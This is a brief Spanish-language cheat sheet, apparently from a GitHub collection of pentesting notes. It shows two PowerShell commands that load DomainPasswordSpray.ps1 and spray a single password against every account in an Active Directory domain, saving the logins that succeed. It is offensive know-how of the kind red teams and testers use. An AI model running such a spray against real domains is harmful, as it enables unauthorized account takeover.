# DomainPasswordSpray.ps1 Cheat Sheet

#### Password Spraying - Fuerza bruta usando una contraseña en particular a todos los usuarios del dominio
```
import-module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password <PASSWORD> -OutFile spray_success -ErrorAction SilentlyContinue
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)